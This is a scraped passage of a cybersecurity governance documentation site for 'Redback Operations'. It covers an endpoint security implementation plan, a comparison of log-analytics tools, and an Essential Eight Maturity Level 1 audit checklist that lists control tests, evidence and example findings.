Access​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#user-access","content":" Role-based access controls (RBAC) will be implemented across all systems to enforce the principle of least privilege, ensuring that users are granted access solely to the resources and functions necessary for their specific roles within Redback Operations. This will help minimize the risk of unauthorized access to sensitive data and reduce the potential for insider threats.  Access Assignment: Access levels will be carefully assigned based on a detailed analysis of each user’s job responsibilities, ensuring that no user has access beyond what is required for their role. This includes defining user roles within the RBAC system, categorizing access needs, and assigning permissions accordingly. Access Requests: A formal process will be established for users to request additional access privileges. All such requests will undergo a thorough review and approval process to ensure that any escalations in access are justified and align with organizational security policies. Periodic Reviews: Regular audits of access levels will be conducted to ensure ongoing compliance with the least privilege principle. These reviews will involve verifying that users’ access rights are still appropriate for their current roles, especially following changes in job responsibilities or organizational restructuring. Access Revocation: Immediate revocation of access privileges will be enforced when users change roles, leave the organization, or no longer require certain access for their duties. This process will be automated where possible to ensure timely removal of unnecessary privileges.  ","version":"Next","tagName":"h3"},{"title":"Admin Access​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#admin-access","content":" Administrative rights will be strictly controlled and limited to essential personnel only, with a focus on reducing the attack surface associated with elevated privileges. Admin access will be granted based on a clear need-to-know basis, ensuring that only those individuals who require such access to perform critical tasks are granted these rights.  ","version":"Next","tagName":"h3"},{"title":"Ease of Implementation​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#ease-of-implementation","content":" Thorough testing will be conducted in controlled environments to identify and address potential issues before deployment. This testing will include simulations of various operational scenarios to ensure that all security measures function correctly under different conditions.  Clear and detailed guidelines will be provided to support the deployment of security measures across the organization. These guidelines will include step-by-step instructions, best practices, and troubleshooting tips, ensuring that all personnel can implement the security measures effectively and with minimal disruption.  To streamline ongoing security, systems for automated software updates will be implemented, ensuring that all devices receive timely patches without requiring manual intervention. This approach will minimize the risk of vulnerabilities due to outdated software. Additionally, the use of user-friendly password management tools will be promoted to simplify the creation, storage, and management of strong passwords, further enhancing security while maintaining ease of use.  ","version":"Next","tagName":"h2"},{"title":"Regulatory Compliance​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#regulatory-compliance","content":" ","version":"Next","tagName":"h2"},{"title":"Compliance​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#compliance","content":" All security measures will fully comply with ISO 27001 standards, ensuring a strong information security management system (ISMS). This compliance covers all aspects of our security operations, aligning them with international best practices.  We will also adhere to NIST cybersecurity guidelines to effectively manage and reduce cyber risks. This includes following the NIST framework for identifying, protecting, detecting, responding to, and recovering from cyber incidents.  To maintain compliance, regular internal and external audits will be scheduled. These audits will help us continually assess our practices and identify areas for improvement.  ","version":"Next","tagName":"h3"},{"title":"Documentation​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#documentation","content":" Detailed records of all security measures, incidents, and compliance activities will be carefully maintained to ensure transparency and accountability. This documentation will include records of risk assessments, security controls, audit findings, and incident responses.  Security incidents and compliance status will be reported to relevant authorities as required by law and organizational policy, ensuring all regulatory obligations are met and providing a clear audit trail.  ","version":"Next","tagName":"h3"},{"title":"Timeline​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#timeline","content":" ","version":"Next","tagName":"h2"},{"title":"Phase 1: Preparation​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#phase-1-preparation","content":" Define project scope, objectives, and key deliverables.Allocate necessary resources, including tools, personnel, and budget.Assign teams with clear roles and responsibilities.Develop a detailed project plan, including key milestones, timelines, and deliverables.Create a risk management plan to anticipate and address potential challenges.  ","version":"Next","tagName":"h3"},{"title":"Phase 2: Execution​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#phase-2-execution","content":" Implement the plan step-by-step, starting with high-priority areas such as securing critical devices and deploying essential security measures.Continuously monitor progress to ensure each step is executed effectively.Make real-time adjustments to address any issues or obstacles that arise, keeping the project on track.  ","version":"Next","tagName":"h3"},{"title":"Phase 3: Review​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#phase-3-review","content":" Evaluate the overall effectiveness of the implementation process.Gather feedback from stakeholders, including team members, end-users, and management.Make necessary adjustments to improve security measures based on the feedback.Prepare a final report summarizing outcomes, lessons learned, and recommendations for continuous improvement.  ","version":"Next","tagName":"h3"},{"title":"Continuous Improvement​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#continuous-improvement","content":" ","version":"Next","tagName":"h2"},{"title":"Monitoring​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#monitoring","content":" Monitoring the effectiveness of security measures is critical. We will develop specific metrics, such as incident response times and compliance rates, and use automated tools to track these metrics in real-time. Regular reviews of this data will allow us to identify any weaknesses or emerging threats, enabling prompt adjustments to our security measures.  ","version":"Next","tagName":"h3"},{"title":"Feedback​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#feedback","content":" Feedback from users and stakeholders will be gathered through various channels, including surveys and regular meetings. This feedback will be analyzed to pinpoint recurring issues or areas for improvement. By addressing these insights, we can refine our security policies, training, and technical measures to better meet user needs and enhance overall security.  ","version":"Next","tagName":"h3"},{"title":"Improvement​","type":1,"pageTitle":"Endpoint Security Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/ip-endpoint-security#improvement","content":" To ensure continuous improvement, we will implement a structured process for regularly updating and enhancing our security measures. This process will incorporate the latest industry best practices and adapt to emerging threats. By staying informed about the latest security trends and technologies, we will maintain a robust and up-to-date security posture, introducing new tools and technologies as necessary to protect against evolving risks. ","version":"Next","tagName":"h3"},{"title":"Monitoring & Log Analytics","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics","content":"","keywords":"","version":"Next"},{"title":"Objective Summary​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#objective-summary","content":" To develop an easy way to implement a cost-effective deployment plan for our Monitoring &amp; Log Analytics policies and procedures.  ","version":"Next","tagName":"h2"},{"title":"Key Subjects​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#key-subjects","content":" ","version":"Next","tagName":"h2"},{"title":"1. Research tools that can be used to collect and analyse log data:​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#1-research-tools-that-can-be-used-to-collect-and-analyse-log-data","content":" Splunk:Redback currently uses Wazuh, which is a useful tool, however I believe Splunk should be added as well. Both have great log management and security monitoring, however they are driven by different approaches, with different sets of features. Wazuh is an open-source platform that provides centralised security event monitoring, threat detection, and compliance management. On the other hand, Splunk is a much broader platform that provides for advanced log analytics, machine learning-based threat detection, and powerful visualisation. Splunk also supports integrations with a wide range of third-party services and have their own tool (Machine Learning Toolkit-MLTK) which enables organisations to run machine learning models on their data for predictions and irregularity detection. This would be useful for Redback operations as they can use AI to help predict possible security threats.Mezmo: This tool also allows you to monitor and analyse log files in real-time. It is accessible in the cloud and enables you to look up, save, and keep data from any application or system, such as Windows, Linux, AWS, and Python. Mezmo could fit in with Wazuh by providing a strong log management and visualisation layer on top of Wazuh’s security monitoring and SIEM capabilities, resulting in a more comprehensive and efficient security solution  ","version":"Next","tagName":"h3"},{"title":"2. Redefine key assets and data categories​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#2-redefine-key-assets-and-data-categories","content":" Key Assets  Fitness gadgets: heart rate monitors, wearable devicesPlatforms for gamified exercise: software that includes game components.Health Monitoring Systems: Tools and applications that monitor the safety of exercise.  Data Categories  User Data: Health measurements and personal data.Activity logs: Performance metrics comprise exercise data.Engagement Information: User interactions and gamification analytics.Safety Information: Health Alerts, Injury Reports.  ","version":"Next","tagName":"h3"},{"title":"3. Redefine Roles and Responsibilities​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#3-redefine-roles-and-responsibilities","content":" Security experts: Safeguard user information and guarantee the safety of the infrastructure and fitness applications.Compliance: Ensures that internal log management rules and legal requirements are followed.Log Administrator: Oversees the policies for log retention, storage, and collection.  ","version":"Next","tagName":"h3"},{"title":"4. Ensure all digital assets are covered in deployment – explain how they will be covered​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#4-ensure-all-digital-assets-are-covered-in-deployment--explain-how-they-will-be-covered","content":" Automated Monitoring: To quickly identify errors and problems, implement automated monitoring systems that continuously track and send alerts based on log data from all assets.Frequent Audits: Update configurations whenever new assets are added and conduct routine audits to ensure that all assets are being properly monitored and logged.  ","version":"Next","tagName":"h3"},{"title":"5. Cost Effectiveness:​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#5-cost-effectiveness","content":" One user can utilize 500 MB of Splunk each day for free. Splunk also has two paid options for more sophisticated features, with pricing available upon request. Mezmo provides a 14-day free trial in addition to several paid choices and a free version, allowing the user to test the tools before fully committing.  ","version":"Next","tagName":"h3"},{"title":"6. Ease of Implementation:​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#6-ease-of-implementation","content":" Splunk Training: Documentation and training materials are available to facilitate learning.User Interface: Offers a strong, configurable multi-line interface. Mezmo Quick Installation: Quick to set up and accessible via web interface.User Interface: User-friendly interface designed for real-time monitoring and log analysis.  ","version":"Next","tagName":"h3"},{"title":"7. Adherence to Regulatory Requirements:​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#7-adherence-to-regulatory-requirements","content":" Mezmo Real-Time Monitoring: Assists in fulfilling regulatory requirements for logging and monitoring across multiple systems and applications by providing real-time insights and alerts. Splunk SOC2, FedRamp, and ISO 27001 Compliance: Uses strict security standards and procedures to guarantee safe data handling and protection.EEOC Compliance: Complies with regulations to ensure ethical and fair employment standards and discrimination-free hiring procedures.Sector-Specific Requirements: Respects laws like GDPR and PCI-DSS to control risks, stay compliant with the law, and maintain customer trust.  ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Monitoring & Log Analytics","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/Monitoring & Log Analytics#references","content":" Leanne Mitton, L.M. (2023). Regulatory Compliance 101: What You Need To Know. Splunk Blogs. Splunk BlogMezmo. (2024). MONITORING AND LOGGING REQUIREMENTS FOR COMPLIANCE. Regulatory Compliance. MezmoRafal Kuc, R.K. (2023). 15 Best Log Analysis Tools &amp; Log Analyzers of 2024 (Paid, Free &amp; Open Source). Sematext. Sematext Blog ","version":"Next","tagName":"h2"},{"title":"Redback_E8_ML1_Assessment_Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist","content":"","keywords":"","version":"Next"},{"title":"Instructions​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#instructions","content":" Redback E8 ML1 Assessment Checklist – InstructionsPurpose: This workbook is designed to support Maturity Level 1 (ML1) assessments across all Essential Eight strategies. Each strategy tab contains ISM-mapped controls, audit test descriptions, and expected artefacts. What You Need to Fill In (per row): Compliance Status (Column K): Select from the dropdown list Findings/Comments (Column L): Describe the audit result or observation Evidence Location (Column M): File path or reference to supporting artefacts Date Tested (Column N): Format as DD/MM/YYYY Assessor (Column O): Your name or initials Do Not Modify: Locked columns such as test description, ISM mapping, audit procedure, or control ID Any formula or data validation dropdowns already in place Scoring Guidance: ❌ Not Implemented – No evidence the control is in place ⚠️ Partially Implemented – Some implementation but incomplete or inconsistent ✅ Implemented – Fully in place and functioning as described 🔁 Alternate Control – A compensating control exists ⛔ Not Applicable – The control is not relevant in this context Additional Notes: Please ensure all evidence referenced is stored in a central location and consistently named You can review worked examples in the first 3 rows of most tabs Need Help? Contact: Shreyas Vivek (ML1 Assessment Lead)  ","version":"Next","tagName":"h2"},{"title":"Glossary​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#glossary","content":" Term\tDefinitionControl Assessment\tThe evaluated status of a control (e.g., effective, partially effective, etc.) Responsible Team\tThe team accountable for operating or implementing the control Assessor\tThe GRC team member reviewing and recording assessment evidence Evidence Location\tPath or reference to the artefact (e.g., logs, screenshots, configs) Effective\tFully meets ISM/Essential Eight requirements Partially Effective\tImplemented but with known limitations or gaps Alternate Control\tA compensating control exists and achieves the same objective Not Implemented\tNo evidence that the control is present or functioning Not Applicable\tThe control does not apply in the system or environment being assessed  ","version":"Next","tagName":"h2"},{"title":"Application Control​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#application-control","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tResponsible Team\tFrequency\tFindings/Comments\tEvidence LocationApplication Control\tML1-AC\tML1-AC-01\tISM-0843\tPrevent execution of EXE/COM files in user profile directories by standard users.\tAttempt to run benign EXE/COM file in temp directories or Desktop.\tExecution logs, screenshots of failed attempts.\tE8MVT, Manual Execution Test\tCybersecurity GRC\tQuarterly\tExample: Attempt EXE execution in C:\\Users\\TestUser\\AppData\\Local\\Temp using E8MVT.\tEx: \\share\\redback-evidence\\ML1-AC-04-MSItest.png Application Control\tML1-AC\tML1-AC-02\tISM-1870\tBlock software library files (DLL/OCX) from executing in user profile/temp folders.\tPlace DLL/OCX files in user space and attempt to invoke using standard tools.\tSystem logs, execution attempts, allowlist enforcement logs.\tE8MVT\tCybersecurity GRC\tQuarterly\tExample: Place DLL in Downloads folder, log execution attempt and result.\tnan Application Control\tML1-AC\tML1-AC-03\tISM-1657\tPrevent script file (BAT, PS, VBS, JS) execution in restricted paths.\tDeploy test scripts into temp folders and execute with user permissions.\tScreenshots of blocked script runs, log entries showing prevention.\tACVT, PowerShell\tCybersecurity GRC\tQuarterly\tExample: Execute BAT script in temp folder, validate block via ACVT and logs.\tnan Application Control\tML1-AC\tML1-AC-04\tISM-1657\tPrevent installation via MSI/MST/MSP in non-privileged locations.\tAttempt to install dummy MSI via user Desktop or Downloads.\tE8MVT reports, MSI install logs, endpoint monitoring logs.\tE8MVT\tCybersecurity GRC\tQuarterly\tAttempted MSI install from Desktop. Execution blocked by allowlist policy. Logs captured.\tnan Application Control\tML1-AC\tML1-AC-05\tISM-1657\tBlock execution of Compiled HTML (CHM) files from temp/user locations.\tRun benign CHM files from various folders and log behavior.\tScreenshot and CHM handling logs.\tManual Test, E8MVT\tCybersecurity GRC\tQuarterly\tCHM file opened in Downloads. Block confirmed via error dialog and policy log.\tnan Application Control\tML1-AC\tML1-AC-06\tISM-1657\tBlock execution of HTML applications (HTA) from browser cache or download folders.\tAttempt to run HTA file from Downloads directory.\tBrowser logs, application policy evidence, HTA test file logs.\tE8MVT, Manual Browser Test\tCybersecurity GRC\tQuarterly\tHTA blocked in browser sandbox. Logged via E8MVT and registry policy audit.\tnan Application Control\tML1-AC\tML1-AC-07\tISM-1657\tBlock Control Panel Applet (CPL) execution from non-system folders.\tRun benign CPL from Downloads and verify execution is blocked.\tACVT reports, Windows logs, allowlist policies.\tACVT\tCybersecurity GRC\tQuarterly\tCPL file blocked from Downloads. Control panel execution policy verified.\tnan Application Control\tML1-AC\tML1-AC-08\tISM-1657\tApplication allowlisting enforced via policy and managed centrally.\tReview allowlist management system and policy distribution (e.g., Intune, GPO).\tAllowlist configuration files, policy logs.\tGroup Policy, Config Audit\tCybersecurity GRC\tQuarterly\tIntune policy pushes tested. Whitelist entries confirmed via config diff.\tnan Application Control\tML1-AC\tML1-AC-09\tISM-1657\tExecution prevention enforced even when file renamed or copied across locations.\tRename known executables (e.g., .txt to .exe) and attempt execution.\tTest logs, screenshots, renamed file handling logs.\tManual Tests, E8MVT\tCybersecurity GRC\tQuarterly\tRenamed .txt to .exe. Block succeeded. Manual trace via endpoint logs.\tnan Application Control\tML1-AC\tML1-AC-10\tISM-1657\tFile execution control verified against known bypass vectors.\tAttempt to exploit known paths (e.g., 8.3 name format, symbolic links).\tOutput of exploit test cases, logs from bypass attempts.\tE8MVT, ACVT, Script Toolkit\tCybersecurity GRC\tQuarterly\tSymbolic link test generated expected block. Logs show rule match.\tnan  ","version":"Next","tagName":"h2"},{"title":"Patch Applications​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#patch-applications","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tResponsible Team\tFrequency\tFindings/Comments\tEvidence LocationPatch Applications\tML1-PA\tML1-PA-01\tISM-1807\tAutomated asset discovery runs at least fortnightly to detect new systems and applications.\tReview scan configuration and logs; validate schedule enforcement.\tScan logs, scheduler output, discovery delta reports.\tQualys, Nessus, GVM\tDevSecOps\tFortnightly\tDiscovery job ran on full subnet range. Delta logs confirmed new hosts were registered in CMDB.\t\\share\\redback-evidence\\ML1-PA-02-dbupdate.png Patch Applications\tML1-PA\tML1-PA-02\tISM-1808\tVulnerability scanner uses an up-to-date vulnerability database.\tCheck database version and last update timestamps in scanner console.\tScanner config files, version logs.\tQualys, Nessus, Rapid7\tDevSecOps\tDaily\tScanner auto-update setting verified. Last update 24h from scan. Screenshot in audit folder.\tnan Patch Applications\tML1-PA\tML1-PA-03\tISM-1698\tVulnerability scans run daily on all internet-facing applications and services.\tValidate daily scan logs and alerting mechanisms for exposed services.\tDaily reports, alerting logs.\tNessus, Tenable.io\tDevSecOps\tDaily\tDaily job logs confirmed for VPN and GitHub endpoints. Alert emails validated.\tnan Patch Applications\tML1-PA\tML1-PA-04\tISM-1699\tFortnightly scans run for office software, email clients, and browsers.\tVerify credentials, schedules, and scope of scan.\tFortnightly reports, credentialed scan logs.\tGVM, Nessus Pro\tDevSecOps\tFortnightly\tFortnightly scan covers PDF, Chrome, Outlook. Credentialed access tested.\tnan Patch Applications\tML1-PA\tML1-PA-05\tISM-1876\tExploitable vulnerabilities on internet-facing services are patched within 48 hours.\tMap CVE disclosure date to patch application date and analyze lag.\tPatch timeline table, remediation logs, CVE tracker screenshots.\tCVE Scanner, Manual review\tDevSecOps\tAs needed\tLogs show patch was applied within 30h of advisory. Exception process documented.\tnan Patch Applications\tML1-PA\tML1-PA-06\tISM-1876\tConfirm all known exploitable vulnerabilities older than 48 hours are patched or mitigated.\tRun patch verification and determine lag beyond allowed window.\tRemediation evidence, exception logs.\tQualys, Sysmon\tDevSecOps\tWeekly\tPatch validation shows high severity CVE remediated in 36h. Logged in JIRA.\tnan Patch Applications\tML1-PA\tML1-PA-07\tISM-1690\tAll internet-facing apps patched within 2 weeks of patch availability.\tCompare software patch date with original vendor release.\tSystem patch logs, vendor release notes.\tPatch management dashboard\tDevSecOps\tWeekly\tGitHub vulnerability flagged on 12 Mar, patched by 24 Mar. Audit trail captured.\tnan Patch Applications\tML1-PA\tML1-PA-08\tISM-1691\tPatches for internal apps (Office, PDF, browsers) applied within one month.\tReview patch cycles and correlate version info with vendor dates.\tPatch audit reports, software version matrix.\tE8MVT, Software Inventory\tDevSecOps\tMonthly\tVersion diff shows PDF reader patched on time. Screenshot in patch folder.\tnan Patch Applications\tML1-PA\tML1-PA-09\tISM-1691\tInternal applications contain no vulnerabilities older than one month.\tUse scanner to verify version compliance.\tList of vulnerable versions, patch timestamps.\tQualys, Nessus, E8MVT\tDevSecOps\tMonthly\tNo critical CVEs older than 30d detected. Scanner report archived.\tnan Patch Applications\tML1-PA\tML1-PA-10\tISM-1905\tAll unsupported third-party software removed from internal and internet-facing systems.\tScan and inventory all active applications; check vendor support lifecycle.\tList of deprecated apps, decommission evidence.\tNessus, Software Asset Management\tDevSecOps\tQuarterly\tList cross-checked with vendor lifecycle dates. Deprecated versions uninstalled.\tnan  ","version":"Next","tagName":"h2"},{"title":"Multi-Factor Authenticatio​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#multi-factor-authenticatio","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tResponsible Team\tFrequency\tFindings/Comments\tEvidence LocationMulti-Factor Authentication\tML1-MF\tML1-MF-01\tISM-1504\tMFA is enforced on all internet-facing Redback services (e.g., GitHub, GCP).\tAttempt user authentication and verify MFA challenge on login.\tAccess attempt logs, screenshots of MFA prompts, enforcement settings.\tGitHub, GCP IAM, Azure Console\tCybersecurity GRC\tMonthly\tLogin attempts from unmanaged device prompted MFA. GitHub org settings verified.\t\\share\\redback-evidence\\ML1-MF-02-dbupdate.png Multi-Factor Authentication\tML1-MF\tML1-MF-02\tISM-1504\tMFA challenge is triggered for remote desktop access to internal systems.\tPerform test RDP session and check for MFA prompt.\tVPN/RDP access logs, security group enforcement evidence.\tAzure AD, Duo, RDP Config\tDevSecOps\tMonthly\tTest RDP connection from home IP required MFA token. Logs captured via Duo dashboard.\tnan Multi-Factor Authentication\tML1-MF\tML1-MF-03\tISM-1679\tAll other internet-facing systems require MFA on login.\tEnumerate services; attempt user login; confirm MFA challenge.\tMFA logs, system login records, user directory screenshots.\tOkta, PingID, Azure MFA\tCybersecurity GRC\tMonthly\tWeb portal MFA enforced via PingID. Screenshot of challenge retained.\tnan Multi-Factor Authentication\tML1-MF\tML1-MF-04\tISM-1679\tMFA enforced on third-party services handling sensitive Redback data.\tIdentify third-party vendors and check their MFA configuration.\tThird-party admin console screenshots, vendor policy docs.\tAdmin Portals, Vendor Reviews\tCybersecurity GRC\tQuarterly\tMFA enabled for billing and support platforms. Vendor policy PDF stored.\tnan Multi-Factor Authentication\tML1-MF\tML1-MF-05\tISM-1680\tMFA enabled (where available) on third-party systems even for non-sensitive use cases.\tAttempt login with a test account; check if MFA can be bypassed or disabled.\tUser access logs, account configuration settings.\tGoogle Admin, Microsoft 365\tCybersecurity GRC\tQuarterly\tTest account prompted for MFA on Outlook web access.\tnan Multi-Factor Authentication\tML1-MF\tML1-MF-06\tISM-1680\tMFA is enabled by default for external (non-organisational) users accessing Redback services.\tSimulate an external login; verify default MFA behavior.\tLogin test results, configuration screen evidence.\tAzure B2B, GitHub Organization\tCybersecurity GRC\tBi-annually\tGitHub default MFA settings for B2B users validated. Screenshot attached.\tnan Multi-Factor Authentication\tML1-MF\tML1-MF-07\tISM-1680\tMFA bypass policies are reviewed monthly and exceptions require formal approval.\tReview all policy exceptions and approvals for validity.\tException tracking sheets, approval forms.\tIAM Dashboard, Jira, Confluence\tCybersecurity GRC\tMonthly\t2 active exceptions reviewed; Jira tickets matched with approvals.\tnan Multi-Factor Authentication\tML1-MF\tML1-MF-08\tISM-1680\tMFA logs are collected and reviewed for suspicious login attempts.\tInspect SIEM logs and MFA monitoring dashboards.\tSIEM alerts, login pattern reports.\tSplunk, Microsoft Sentinel\tCybersecurity GRC\tWeekly\tSIEM rule triggered on unusual geo-login. Event closed with follow-up.\tnan Multi-Factor Authentication\tML1-MF\tML1-MF-09\tISM-1680\tUsers are periodically trained on recognizing MFA-related phishing and social engineering attempts.\tReview training logs, completion rates, and test scores from awareness modules.\tTraining records, quiz results.\tKnowBe4, LMS Reports\tCybersecurity GRC\tAnnually\tCompletion rate was 94% this cycle. Quiz results archived.\tnan Multi-Factor Authentication\tML1-MF\tML1-MF-10\tISM-1680\tLost or stolen MFA tokens/devices are reported and revoked within 24 hours.\tReview helpdesk tickets and IAM logs for revocation response time.\tIncident reports, audit trail of token disablement.\tHelpdesk Portal, IAM Logs\tCybersecurity GRC\tAs needed\tOne incident reported in last quarter. Response time 3 hours.\tnan  ","version":"Next","tagName":"h2"},{"title":"Restrict Admin Privileges​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#restrict-admin-privileges","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tResponsible Team\tFrequency\tFindings/Comments\tEvidence LocationRestrict Admin Privileges\tML1-RA\tML1-RA-01\tISM-0439\tAccess to administrative privileges is granted only with documented and approved justification.\tReview access request forms and change control logs.\tRequest logs, approval emails, workflow tickets.\tActive Directory, JIRA, Confluence\tCybersecurity GRC\tQuarterly\tJIRA change requests matched with AD privilege assignments. Confluence records archived.\t\\share\\redback-evidence\\ML1-RA-01-priv-approval.pdf Restrict Admin Privileges\tML1-RA\tML1-RA-02\tISM-0402\tPrivileged accounts are restricted from accessing the internet and web services.\tAttempt to access internet from admin account; validate proxy/firewall blocks.\tAccess logs, proxy blocks, firewall rules.\tSquid Proxy, FW ACLs, AD GPO\tDevSecOps\tQuarterly\tAdmin account internet access denied by proxy. Squid logs show block and policy hit.\tnan Restrict Admin Privileges\tML1-RA\tML1-RA-03\tISM-0411\tPrivileged accounts are not used for email communication.\tTest mailbox functionality for admin accounts.\tUser directory exports, mail server configs, admin logs.\tExchange Admin Center, ADUC\tCybersecurity GRC\tQuarterly\tMail server config shows SMTP/IMAP disabled for admin accounts. No active mailboxes.\tnan Restrict Admin Privileges\tML1-RA\tML1-RA-04\tISM-0412\tAll privileged activities are performed from a separate, secure administrative environment.\tConfirm use of separate workstations or virtual environments.\tNetwork segmentation plans, admin workstation list.\tAD Groups, VLAN configs, BloodHound\tDevSecOps\tQuarterly\tPrivileged workstation IPs confirmed isolated. VLAN config and jump server logs validated.\tnan Restrict Admin Privileges\tML1-RA\tML1-RA-05\tISM-0403\tStandard (unprivileged) accounts cannot log into privileged environments.\tAttempt login using unprivileged account; verify group policy enforcement.\tAD logs, denied login attempts, policy snapshots.\tBloodHound, GPO reports\tCybersecurity GRC\tQuarterly\tLogin attempt using unprivileged account denied. Policy enforcement verified via AD logs.\tnan Restrict Admin Privileges\tML1-RA\tML1-RA-06\tISM-0404\tUnprivileged users cannot run PowerShell remoting (PSRemote) or elevate through RDP/WinRM.\tTest PSRemote as a normal user and monitor event logs.\tRemote command attempt logs, permission settings.\tPowerShell, Windows Event Logs\tDevSecOps\tQuarterly\tPSRemote blocked for non-admin users. Event logs captured failed remoting attempts.\tnan Restrict Admin Privileges\tML1-RA\tML1-RA-07\tISM-0414\tAdmin accounts cannot be used to log into unprivileged workstations or environments.\tAttempt login from domain admin account to standard user machine.\tDeny login logs, group policy configuration.\tGPO settings, WinEventLogs\tCybersecurity GRC\tQuarterly\tGPO policy prevents domain admins from accessing standard endpoints. Logs confirmed.\tnan Restrict Admin Privileges\tML1-RA\tML1-RA-08\tISM-0413\tUser cannot elevate privilege from unprivileged session using tools like ‘runas’, RDP, or remote management.\tRun tests using ‘runas’, RDP tools and remote admin tools from user accounts.\tPrivilege escalation logs, blocked actions, audit logs.\tRunas, RDP, Local Group Policy\tCybersecurity GRC\tQuarterly\t‘Runas’ and RDP elevation attempts blocked. Logs show failed escalation events.\tnan Restrict Admin Privileges\tML1-RA\tML1-RA-09\tISM-0420\tAll administrative accounts are reviewed quarterly for relevance and activity.\tReview access logs, AD membership, last login timestamps.\tAdmin account audit 